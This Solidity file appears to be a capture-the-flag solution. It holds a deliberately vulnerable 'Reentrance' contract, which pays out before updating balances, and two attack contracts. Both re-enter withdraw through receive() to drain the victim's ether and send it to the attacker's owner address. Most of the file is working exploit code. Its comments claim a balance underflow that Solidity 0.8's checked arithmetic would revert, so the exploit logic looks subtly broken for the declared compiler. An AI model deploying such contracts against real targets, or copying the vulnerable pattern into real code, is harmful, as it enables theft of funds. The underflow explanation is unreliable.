// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
    c = a + b;
    assert(c >= a);
    return c;
  }
}

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract ReentranceAtk {
    Reentrance public reentrance;
    address public owner;
    uint256 public donationValue;
    bool public exploited;

    constructor (address payable contractAddress) {
        reentrance  = Reentrance(contractAddress);
        owner = msg.sender;
        exploited = false;
    }

    // Underflows balance into the contract
    function attack() external payable {
        require(msg.value > 0, "donate something!");
        donationValue = msg.value;

        // donate to ourself
        reentrance.donate{value: msg.value}(address(this));

        // withdraw 1 way and trigger the re-entrancy exploit
        reentrance.withdraw(msg.value);

        // because the victim contract underflowed our balance
        // we are now able to drain the whole balance of the contract
        reentrance.withdraw(address(reentrance).balance);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    receive() external payable {
        // We need to re-enter only once
        // By re-entering our new balance will be equal to (2^256)-1
        if (!exploited) {
            exploited = true;
            // re-enter the contract withdrawing donation value again
            reentrance.withdraw(donationValue);
        }
    }

    function withdraw() external {
        uint256 balance = address(this).balance;
        (bool success, ) = owner.call{value: balance}("");
        require(success, "withdraw failed");
    }
}

contract ReentranceAttack {
    Reentrance public target;
    address public owner;
  
    constructor(address payable _target) payable {
        target = Reentrance(_target);
        owner = msg.sender;
    }
  
    function attack_1_causeOverflow() public {
        target.donate{value:1}(address(this));
        target.withdraw(1);
    }
  
    function attack_2_deplete() public {
        target.withdraw(address(target).balance);
    }
  
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    receive() external payable {
        target.withdraw(1);
    }

    function withdraw() external {
        uint256 balance = address(this).balance;
        (bool success, ) = owner.call{value: balance}("");
        require(success, "withdraw failed");
    }
}
